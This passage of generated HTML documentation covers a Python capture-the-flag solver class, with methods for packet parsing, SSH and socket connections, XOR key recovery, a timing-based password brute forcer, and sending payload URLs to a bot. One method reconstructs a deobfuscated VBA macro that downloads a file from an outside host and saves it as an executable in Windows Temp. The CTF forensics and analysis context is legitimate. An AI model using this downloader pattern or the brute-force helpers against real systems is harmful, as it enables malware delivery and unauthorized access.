                return packet[&#34;Raw&#34;].load.decode(&#34;utf-8&#34;)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.searching_records"><code class="name flex">
<span>def <span class="ident">searching_records</span></span>(<span>self, log_file, func, *args, **kwargs)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def searching_records(self, log_file, func, *args, **kwargs):
    for record in log_file.records():
        func(record, *args, **kwargs)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.send_file"><code class="name flex">
<span>def <span class="ident">send_file</span></span>(<span>self, file)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def send_file(self, file):
    url = self.complete_url + &#34;/upload&#34;
    with open(file, &#34;rb&#34;) as f:
        files = {&#34;file&#34;: f}
        response = requests.post(url, files=files)
    if response.status_code == 200:
        return response.json()
    else:
        return response.text</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.send_to_bot"><code class="name flex">
<span>def <span class="ident">send_to_bot</span></span>(<span>self, payload_url)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def send_to_bot(self, payload_url):
    &#34;&#34;&#34;
    Description:
        Send the payload URL to the bot.

    Args:
        payload_url (_type_): _description_

    Returns:
        _type_: _description_
    &#34;&#34;&#34;
    headers = {&#34;Content-Type&#34;: &#34;application/x-www-form-urlencoded&#34;}
    data = {&#34;url&#34;: payload_url}
    response = requests.post(self.bot_url, headers=headers, data=data)
    return response.text</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>Send the payload URL to the bot.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>payload_url</code></strong> :&ensp;<code>_type_</code></dt>
<dd><em>description</em></dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>_type_</code></dt>
<dd><em>description</em></dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.sending_request"><code class="name flex">
<span>def <span class="ident">sending_request</span></span>(<span>self, exploit=None, verbose=False)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def sending_request(self, exploit=None, verbose=False):

    # payload = &#34;```python\nwith open(&#39;/app/flag.txt&#39;) as f:\n result = f.read()\nprint(result)\n```&#34;

    headers = {
        &#34;Content-Type&#34;: &#34;application/json&#34;,
        &#34;Origin&#34;: self.real_url,
        &#34;Referer&#34;: f&#34;{self.real_url}/&#34;,
        &#34;User-Agent&#34;: &#34;Mozilla/5.0 (X11; Linux x86_64)&#34;,
        &#34;Accept&#34;: &#34;*/*&#34;,
    }
    payload = {&#34;equation&#34;: exploit}

    response = requests.post(self.url_path, headers=headers, json=payload)
    if verbose:
        print(&#34;[+] Status:&#34;, response.status_code)
        print(&#34;[+] Response:&#34;, response.text)
        print(response.json())
    return response.json()</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.setup"><code class="name flex">
<span>def <span class="ident">setup</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def setup(self):
    self.elf = self.pwn.context.binary = self.pwn.ELF(self.challenge_file)
    self.pwn.context.terminal = [&#34;tmux&#34;, &#34;splitw&#34;, &#34;-h&#34;]</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.setup_request"><code class="name flex">
<span>def <span class="ident">setup_request</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def setup_request(self):
    self.session = requests.Session()</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.setup_sse"><code class="name flex">
<span>def <span class="ident">setup_sse</span></span>(<span>self, sse_url)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def setup_sse(self, sse_url):
    self.messages = SSEClient(sse_url, session=self.session)
    first = next(self.messages).data
    m = re.search(r&#34;session_id=([a-f0-9]+)&#34;, first)
    if not m:
        raise SystemExit(&#34; Couldn&#39;t get session_id&#34;)
    self.sid = m.group(1)
    self.post_url = f&#34;{self.base_url}/messages/?session_id={self.sid}&#34;</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.simple_payload_send"><code class="name flex">
<span>def <span class="ident">simple_payload_send</span></span>(<span>self, payload, lines=1)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def simple_payload_send(self, payload, lines=1):
    &#34;&#34;&#34;
    Description:
        Sends a simple payload to the connection

    Args:
        payload (str): Payload to send
        lines (int, optional): Number of lines to receive. Defaults to 1.

    Returns:
        bytes: Output of the connection
    &#34;&#34;&#34;
    bruter = CTFSolver(conn=&#34;remote&#34;, url=self.url, port=self.port)
    bruter.initiate_connection()
    bruter.menu_text = self.menu_text
    bruter.menu_num = self.menu_num
    bruter.send_menu(choice=payload)
    output = bruter.recv_lines(lines, save=True)

    if len(output) &gt; 0:
        return output[0]</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>Sends a simple payload to the connection</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>payload</code></strong> :&ensp;<code>str</code></dt>
<dd>Payload to send</dd>
<dt><strong><code>lines</code></strong> :&ensp;<code>int</code>, optional</dt>
<dd>Number of lines to receive. Defaults to 1.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>bytes</code></dt>
<dd>Output of the connection</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.simulate_ansi_typing"><code class="name flex">
<span>def <span class="ident">simulate_ansi_typing</span></span>(<span>self, text, escape_codes=True)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def simulate_ansi_typing(self, text, escape_codes=True):
    result = &#34;&#34;
    for char in text:
        if char == &#34; &#34;:
            # Simulate clearing and moving cursor for space too
            result += &#34;\x1b[?25l\x1b[K\x1b[1C\x1b[?25h&#34;
        else:
            result += f&#34;\x1b[?25l{char}\x1b[?25h&#34;
    # result += &#34;\n&#34;  # Optional: simulate Enter
    if escape_codes:
        # Add ANSI escape codes to simulate typing
        return repr(result)
    return result</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.skew_get_value"><code class="name flex">
<span>def <span class="ident">skew_get_value</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def skew_get_value(self):
    self.hive = RegistryHive(self.challenge_file)

    with open(self.challenge_file, &#34;rb&#34;) as f:
        self.hive_data = f.read()

    # print(self.get_functions(self.hive))
    # control_set = self.hive.get_key(r&#34;ControlSet001&#34;)
    skew1_key = self.hive.get_key(r&#34;\ControlSet001\Control\Lsa\Skew1&#34;)
    print(self.get_functions(skew1_key))
    # print(self.get_attributes(skew1_key))
    # cell_offset = self._discover_offset(skew1_key)
    # print(f&#34;Offset of Skew1 key: {cell_offset}&#34;)

    for i in skew1_key.iter_values():
        print(i.name, i.value)
        if i.name == &#34;SkewMatrix&#34;:
            return i.value

    return None</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.smart_extract_packets"><code class="name flex">
<span>def <span class="ident">smart_extract_packets</span></span>(<span>self,<br>pcap_file,<br>pcap_function:str,<br>raw:bool=False,<br>save:bool=False,<br>filename_save:str='packets.pickle',<br>folder_save:str='data')</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def smart_extract_packets(
    self,
    pcap_file,
    pcap_function: str,
    raw: bool = False,
    save: bool = False,
    filename_save: str = &#34;packets.pickle&#34;,
    folder_save: str = &#34;data&#34;,
):
    &#34;&#34;&#34;
    Description:
        Extracts the packets from the pcap file and saves them as a dictionary.
        If the file already exists, it loads the file.

    Args:
        pcap_file (str): Path to the pcap file.
        pcap_function (str): Function to use to extract the packets.[scapy, pyshark]
        raw (bool, optional): Option to return the raw packets. Defaults to False.
        save (bool, optional): Option to load saved file . Defaults to False.
        filename_save (str, optional): Filename to save the packets if enabled. Defaults to &#34;packets.pickle&#34;.
        folder_save (str, optional): Folder to save the filename if save is enabled. Defaults to &#34;data&#34;.
    &#34;&#34;&#34;

    file_path = None

    if save:
        file_path = self.folfil(folder_save, filename_save)

    if file_path is None or file_path.exists() is False:
        # Read the pcap file

        packets = self.unified_extract_packets(pcap_file, pcap_function, raw=raw)

        # Save the packets
        if save:
            self.pickle_save_data(
                packets, filename=filename_save, folder=folder_save
            )
    else:
        packets = self.pickle_load_data(file_path)
    return packets</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>Extracts the packets from the pcap file and saves them as a dictionary.
If the file already exists, it loads the file.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>pcap_file</code></strong> :&ensp;<code>str</code></dt>
<dd>Path to the pcap file.</dd>
<dt><strong><code>pcap_function</code></strong> :&ensp;<code>str</code></dt>
<dd>Function to use to extract the packets.[scapy, pyshark]</dd>
<dt><strong><code>raw</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>Option to return the raw packets. Defaults to False.</dd>
<dt><strong><code>save</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>Option to load saved file . Defaults to False.</dd>
<dt><strong><code>filename_save</code></strong> :&ensp;<code>str</code>, optional</dt>
<dd>Filename to save the packets if enabled. Defaults to "packets.pickle".</dd>
<dt><strong><code>folder_save</code></strong> :&ensp;<code>str</code>, optional</dt>
<dd>Folder to save the filename if save is enabled. Defaults to "data".</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.smarter_bruteforcer"><code class="name flex">
<span>def <span class="ident">smarter_bruteforcer</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def smarter_bruteforcer(self):
    &#34;&#34;&#34;
    Check the first letter first, and then continue
    &#34;&#34;&#34;
    dummy = &#34;a&#34; * 5  # dummy suffix for length calculation
    for length in range(5, 30):  # keep short for demonstration
        pass</code></pre>
</details>
<div class="desc"><p>Check the first letter first, and then continue</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.snap_initiate_connection"><code class="name flex">
<span>def <span class="ident">snap_initiate_connection</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def snap_initiate_connection(self):
    self.client = Client()
    self.client.connect(self.url, self.port)
    result = self.client.read_area(
        area=snap7_util.snap7.types.Areas.DB, db_number=1, start=0, size=100
    )
    print(result)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.socket_initiate_connection"><code class="name flex">
<span>def <span class="ident">socket_initiate_connection</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def socket_initiate_connection(self):

    with socket.create_connection((self.url, self.port), timeout=10) as s:
        # Receive initial banner or prompt
        data = s.recv(4096)
        print(&#34;Received:&#34;, data.decode(errors=&#34;ignore&#34;))

        # Example: send a newline or command if required by the challenge
        s.sendall(b&#34;\n&#34;)
        response = s.recv(4096)
        print(&#34;Response:&#34;, response.decode(errors=&#34;ignore&#34;))

        # Try common commands if it&#39;s a text interface
        for cmd in [b&#34;status\n&#34;, b&#34;secret\n&#34;, b&#34;help\n&#34;, b&#34;info\n&#34;]:
            s.sendall(cmd)
            resp = s.recv(4096)
            print(f&#34;Sent {cmd.strip().decode()}: {resp.decode(errors=&#39;ignore&#39;)}&#34;)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.solve"><code class="name flex">
<span>def <span class="ident">solve</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def solve(self):
    pass</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.solve_challenge"><code class="name flex">
<span>def <span class="ident">solve_challenge</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def solve_challenge(self):
    &#34;&#34;&#34;Main function to solve the challenge&#34;&#34;&#34;

    # Extract the encrypted data from the decompiled code (little-endian format)
    # Convert hex values to bytes in little-endian order

    # Stage 1 data from local_258, local_250, local_248, local_240, local_238
    encrypted_stage1 = (
        self.hex_to_bytes_le(0x59E9BA9E8F463D01, 8)
        + self.hex_to_bytes_le(0x5B94C9EA56CFFF4F, 8)
        + self.hex_to_bytes_le(0xC1129B387F683E5, 8)
        + self.hex_to_bytes_le(0xC19D94E581D7E07A, 8)
        + self.hex_to_bytes_le(0x2D2E57E4, 4)
    )

    # Stage 2 data from local_228, local_220, local_218, local_210, local_208
    encrypted_stage2 = (
        self.hex_to_bytes_le(0x4E9EF0D5EA375C64, 8)
        + self.hex_to_bytes_le(0x48E7DEA62BDB901D, 8)
        + self.hex_to_bytes_le(0x5A4654DEE5B1D698, 8)
        + self.hex_to_bytes_le(0x8D8E95F2979D8315, 8)
        + self.hex_to_bytes_le(0x703F1481, 4)
    )

    print(&#34;[*] Attempting to recover the key...&#34;)
    print(f&#34;[*] Stage 1 encrypted data length: {len(encrypted_stage1)}&#34;)
    print(f&#34;[*] Stage 2 encrypted data length: {len(encrypted_stage2)}&#34;)

    # Try common flag prefixes (focusing on ECSC format)
    common_prefixes = [b&#34;ECSC{&#34;, b&#34;ecsc{&#34;]

    for prefix in common_prefixes:
        print(f&#34;\n[*] Trying prefix: {prefix.decode()}&#34;)

        # Try different key lengths (minimum 5 as per the code)
        for key_length in range(5, 21):
            print(f&#34;[*] Trying key length: {key_length}&#34;)

            # Try to find a key that produces the expected prefix
            # We&#39;ll try a brute force approach for short keys
            if key_length &lt;= 8:
                # For short keys, try common patterns
                test_keys = [
                    b&#34;hello&#34; + b&#34;a&#34; * (key_length - 5),
                    b&#34;password&#34;[:key_length],
                    b&#34;12345&#34; + b&#34;a&#34; * (key_length - 5),
                    b&#34;admin&#34; + b&#34;a&#34; * (key_length - 5),
                    b&#34;key12&#34; + b&#34;a&#34; * (key_length - 5),
                    b&#34;test1&#34; + b&#34;a&#34; * (key_length - 5),
                ]

                for test_key in test_keys:
                    if len(test_key) != key_length:
                        continue

                    # First decrypt stage 1 with the test key
                    stage1_result = self.xor_decrypt(encrypted_stage1, test_key)

                    # Then decrypt stage 2 with stage 1 result
                    final_result = self.xor_decrypt(encrypted_stage2, stage1_result)

                    # Check if result starts with expected prefix
                    if final_result.startswith(prefix):
                        print(f&#34;[+] FOUND POTENTIAL KEY: {test_key}&#34;)
                        print(f&#34;[+] Decrypted flag: {final_result}&#34;)
                        return test_key, final_result

    # If simple brute force doesn&#39;t work, try reverse engineering approach
    print(&#34;\n[*] Simple brute force failed. Trying reverse engineering approach...&#34;)

    # Assume the flag starts with &#34;ECSC{&#34; and try to work backwards
    target_prefix = b&#34;ECSC{&#34;

    # Try to find what stage1_result should be to produce target_prefix
    for key_len in range(5, 16):
        print(f&#34;[*] Reverse engineering with key length: {key_len}&#34;)

        # Calculate what the stage1 result should start with
        stage1_prefix = []
        for i in range(min(len(target_prefix), len(encrypted_stage2))):
            stage1_prefix.append(encrypted_stage2[i] ^ target_prefix[i])

        stage1_prefix_bytes = bytes(stage1_prefix)
        print(f&#34;[*] Stage1 result should start with: {stage1_prefix_bytes.hex()}&#34;)

        # Now try to find what key produces this stage1_prefix
        key_candidate = []

        for i in range(min(len(stage1_prefix_bytes), len(encrypted_stage1))):
            key_byte = encrypted_stage1[i] ^ stage1_prefix_bytes[i]
            key_candidate.append(key_byte)

        if len(key_candidate) &gt;= 5:
            # Extend key to full length by repeating pattern
            full_key = (key_candidate * ((key_len // len(key_candidate)) + 1))[
                :key_len
            ]
            test_key = bytes(full_key)

            print(f&#34;[*] Testing key candidate: {test_key}&#34;)

            # Test this key
            stage1_result = self.xor_decrypt(encrypted_stage1, test_key)
            final_result = self.xor_decrypt(encrypted_stage2, stage1_result)

            print(f&#34;[*] Result: {final_result}&#34;)

            # Check if it looks like a valid flag
            if b&#34;ECSC{&#34; in final_result or b&#34;ecsc{&#34; in final_result:
                print(f&#34;[+] FOUND KEY: {test_key}&#34;)
                print(f&#34;[+] FLAG: {final_result}&#34;)
                return test_key, final_result

    print(&#34;[-] Could not find the key automatically&#34;)
    return None, None</code></pre>
</details>
<div class="desc"><p>Main function to solve the challenge</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.solve_equations"><code class="name flex">
<span>def <span class="ident">solve_equations</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def solve_equations(self):
    self.cnd1, self.cnd2, self.cnd3 = symbols(&#34;cnd1 cnd2 cnd3&#34;)

    # Define the equations
    eq1 = Eq(self.cnd1**3 + self.cnd3**2 + self.cnd2, self.v1)
    eq2 = Eq(self.cnd2**3 + self.cnd1**2 + self.cnd3, self.v2)
    eq3 = Eq(self.cnd3**3 + self.cnd2**2 + self.cnd1, self.v3)
    eq4 = Eq(self.cnd1 + self.cnd2 + self.cnd3, self.v4)

    solution = solve((eq1, eq2, eq3, eq4), (self.cnd1, self.cnd2, self.cnd3))
    return solution</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.sorting_results"><code class="name flex">
<span>def <span class="ident">sorting_results</span></span>(<span>self, results)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def sorting_results(self, results):
    results = list(set(results))
    results = sorted(results, key=lambda x: len(x), reverse=True)
    return results</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.ssh_connect"><code class="name flex">
<span>def <span class="ident">ssh_connect</span></span>(<span>self, **kwargs)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def ssh_connect(self, **kwargs):
    &#34;&#34;&#34;
    Descrption : Establish SSH connection
    Parameters :
        - user : username
        - host : hostname
        - port : port number
        - password : password

    Returns : None
    &#34;&#34;&#34;
    user = kwargs.get(&#34;user&#34;, self.user)
    host = kwargs.get(&#34;host&#34;, self.host)
    port = kwargs.get(&#34;port&#34;, self.port)
    password = kwargs.get(&#34;password&#34;, self.password)

    if any([user is None, host is None, port is None, password is None]):
        raise &#34;Invalid SSH connection parameters&#34;
        return

    self.ssh_connection = self.pwn.ssh(user, host, port, password)</code></pre>
</details>
<div class="desc"><p>Descrption : Establish SSH connection
Parameters :
- user : username
- host : hostname
- port : port number
- password : password</p>
<p>Returns : None</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.str_xor"><code class="name flex">
<span>def <span class="ident">str_xor</span></span>(<span>self, secret, key)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def str_xor(self, secret, key):
    # extend key to secret length
    new_key = key
    i = 0
    while len(new_key) &lt; len(secret):
        new_key = new_key + key[i]
        i = (i + 1) % len(key)
    return &#34;&#34;.join(
        [
            chr(ord(secret_c) ^ ord(new_key_c))
            for (secret_c, new_key_c) in zip(secret, new_key)
        ]
    )</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.stream_identifier"><code class="name flex">
<span>def <span class="ident">stream_identifier</span></span>(<span>self, pkt)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def stream_identifier(self, pkt):
    if TCP in pkt:
        src = pkt[IP].src
        dst = pkt[IP].dst
        sport = pkt[TCP].sport
        dport = pkt[TCP].dport
        # Create a unique identifier for both directions
        return tuple(sorted([(src, sport), (dst, dport)]))
    return None</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.test_letter"><code class="name flex">
<span>def <span class="ident">test_letter</span></span>(<span>self, password)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def test_letter(self, password):
    alphabet = string.ascii_letters + string.digits + string.punctuation

    results = []

    for i in alphabet:
        connector = CTFSolver(
            conn=self.conn_type, file=self.file, url=self.url, port=self.port
        )

        connector.menu_text = &#34;Give me password and number in json: &#34;
        connector.menu_num = 0

        connector.initiate_connection()
        connector.recv_lines(number=2, display=False)
        start_time = time.time()
        connector.send_menu(
            self.payload_maker(password + i, self.flouri_min), display=False
        )
        response = connector.recv_lines(number=1, save=True)

        connector.conn.close()

        end_time = time.time()

        results.append((i, end_time - start_time))

    results = sorted(results, key=lambda x: x[1])

    return results</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.testin_streams"><code class="name flex">
<span>def <span class="ident">testin_streams</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def testin_streams(self):
    # session_index = self.pyshark_extrac_tcp_stream_numbers(self.challenge_file)
    print(&#34;Extracting tcp stream&#34;)
    packets = self.pyshark_extract_tcp_streams(self.challenge_file, 4)
    print(&#34;Extracted Streams&#34;)
    # self.pickle_save_data(packets, &#34;packets_stream_4.pickle&#34;)

    packet_keys = packets.keys()
    packet_keys = sorted(packet_keys)

    # print(&#34;Packet keys:&#34;, packet_keys)

    for i in range(packet_keys[0], packet_keys[0] + 7):
        print(f&#34;Packet {i}:&#34;)
        print(packets[i].tcp.payload)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.testing_ansii_escape"><code class="name flex">
<span>def <span class="ident">testing_ansii_escape</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def testing_ansii_escape(self):
    # self.play_game()

    text_until = self.simulate_ansi_typing(&#34;&gt; &#34;)
    print(text_until)
    phrase = b&#34;The number on the table is 31&#34;
    print(f&#34;Simulating typing: {phrase}&#34;)
    simulated_typing = self.simulate_ansi_typing(phrase)
    print(f&#34;Simulated typing output: {simulated_typing}&#34;)

    encoded = &#34;\x1b[?25lT\x1b[?25h\x1b[?25lh\x1b[?25h\x1b[?25le\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25ln\x1b[?25h\x1b[?25lu\x1b[?25h\x1b[?25lm\x1b[?25h\x1b[?25lb\x1b[?25h\x1b[?25le\x1b[?25h\x1b[?25lr\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25lo\x1b[?25h\x1b[?25ln\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25lt\x1b[?25h\x1b[?25lh\x1b[?25h\x1b[?25le\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25lt\x1b[?25h\x1b[?25la\x1b[?25h\x1b[?25lb\x1b[?25h\x1b[?25ll\x1b[?25h\x1b[?25le\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25li\x1b[?25h\x1b[?25ls\x1b[?25h\x1b[?25l\x1b[K\x1b[1C\x1b[?25h\x1b[?25l3\x1b[?25h\x1b[?25l1\x1b[?25h\n&#34;

    print(f&#34;Encoded output: {encoded}&#34;)
    # Simulate sending the encoded string
    encoded = self.extract_printable_with_spaces(encoded)
    print(f&#34;Extracted printable output: {encoded}&#34;)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.textFromPDF"><code class="name flex">
<span>def <span class="ident">textFromPDF</span></span>(<span>self, file=None)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def textFromPDF(self, file=None):
    &#34;&#34;&#34;
    Extracts text from a PDF file.

    Args:
        file (str): Path to the PDF file. Defaults to the challenge file.

    Returns:
        str: The extracted text.
    &#34;&#34;&#34;
    if file is None:
        file = self.challenge_file

    with pdfplumber.open(file) as pdf:
        text = &#34;&#34;
        for page in pdf.pages:
            text += page.extract_text()
    return text</code></pre>
</details>
<div class="desc"><p>Extracts text from a PDF file.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>file</code></strong> :&ensp;<code>str</code></dt>
<dd>Path to the PDF file. Defaults to the challenge file.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>str</code></dt>
<dd>The extracted text.</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.to_hex"><code class="name flex">
<span>def <span class="ident">to_hex</span></span>(<span>self, data)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def to_hex(self, data):
    if type(data) == str:
        return &#34;&#34;.join([hex(ord(c)) for c in data])
    return &#34;&#34;.join([hex(ord(c))[2:] for c in data])</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.tools_result"><code class="name flex">
<span>def <span class="ident">tools_result</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def tools_result(self):
    # 4) Listen for the tools result (either an &#34;id&#34;:2 result or a tools/result notification)
    for msg in self.messages:
        try:
            pkt = json.loads(msg.data)
        except json.JSONDecodeError:
            continue

        # Case A: direct JSON-RPC reply
        if pkt.get(&#34;id&#34;) == 2 and &#34;result&#34; in pkt:
            out = pkt[&#34;result&#34;]
        # Case B: a tools/result notification
        elif (
            pkt.get(&#34;method&#34;) == &#34;tools/result&#34;
            and pkt.get(&#34;params&#34;, {}).get(&#34;id&#34;) == 2
        ):
            out = pkt[&#34;params&#34;][&#34;result&#34;]
        else:
            continue

        # out might be a string or a more structured object.
        text = out if isinstance(out, str) else json.dumps(out)

        # Search for our ECSC flag
        m2 = re.search(r&#34;(ECSC\{.*?\})&#34;, text)
        if m2:
            flag = m2.group(1)
            print(&#34;Flag found:&#34;, flag)
        else:
            print(&#34;No flag in tool output. Raw output:&#34;)
            print(text)
        break
    return flag</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.translated"><code class="name flex">
<span>def <span class="ident">translated</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def translated(self):  # Reconstructing the strings based on the VBA code logic
    part_1 = (
        &#34;https://elvesfactory/&#34;
        + chr(ord(&#34;H&#34;))
        + chr(84)
        + chr(ord(&#34;B&#34;))
        + &#34;&#34;
        + chr(123)
        + &#34;&#34;
        + chr(84)
        + chr(ord(&#34;h&#34;))
        + &#34;1&#34;
        + chr(125 - 10)
        + chr(ord(&#34;_&#34;))
        + &#34;1s&#34;
        + chr(95)
        + &#34;4&#34;
    )
    part_2 = &#34;_&#34; + &#34;present&#34;.replace(&#34;e&#34;, &#34;3&#34;) + chr(85 + 10)
    part_3 = &#34;everybody&#34;.replace(&#34;e&#34;, &#34;3&#34;)
    part_3 = part_3.replace(&#34;o&#34;, &#34;0&#34;) + &#34;_&#34;
    part_4 = (
        chr(ord(&#34;w&#34;))
        + &#34;4&#34;
        + chr(110)
        + &#34;t&#34;
        + chr(115)
        + &#34;_&#34;
        + chr(ord(&#34;f&#34;))
        + &#34;0&#34;
        + chr(121 - 7)
        + chr(95)
    )
    part_5 = &#34;christmas&#34;.replace(&#34;i&#34;, &#34;1&#34;)
    part_5 = part_5.replace(&#34;a&#34;, &#34;4&#34;) + chr(119 + 6)

    # Resultant concatenated string for &#34;strRT&#34;
    part_6 = part_1 + part_2 + part_3 + part_4 + part_5

    # Generating the &#39;strTecation&#39; path
    part_7 = &#34;c:\\&#34; + chr(ord(&#34;W&#34;)) + &#34;indows\\&#34; + chr(ord(&#34;T&#34;)) + &#34;emp\\444.exe&#34;

    # Placeholder for variable `mttt`, assuming it is defined elsewhere
    mttt = 120  # Adjust as per VBA code logic
    part_7 = (
        &#39;CreateObject(&#34;MSXML2.&#39;
        + chr(mttt - 54)
        + chr(mttt)
        + chr(mttt - 11)
        + chr(mttt - 12)
        + chr(72)
        + chr(84)
        + chr(84)
        + chr(80)
        + &#39;&#34;)&#39;
    )

    # Simulating VBA code file writing
    output_lines = []
    output_lines.append(f&#34;strRT = {part_6}&#34;)
    output_lines.append(f&#39;strTecation = &#34;{part_7}&#34;&#39;)
    output_lines.append(f&#34;Set objXMLHTTP = {part_7}&#34;)
    output_lines.append(&#39;objXMLHTTP.open &#34;GET&#34;, strRT, False&#39;)
    output_lines.append(&#34;objXMLHTTP.send()&#34;)
    output_lines.append(&#34;If objXMLHTTP.Status = 200 Then&#34;)
    output_lines.append(&#39;Set objADOStream = CreateObject(&#34;ADODB.Stream&#34;)&#39;)
    output_lines.append(&#34;objADOStream.Open&#34;)
    output_lines.append(&#34;objADOStream.Type = 1&#34;)
    output_lines.append(&#34;objADOStream.Write objXMLHTTP.ResponseBody&#34;)
    output_lines.append(&#34;objADOStream.Position = 0&#34;)
    output_lines.append(f&#34;objADOStream.SaveToFile {part_7}&#34;)
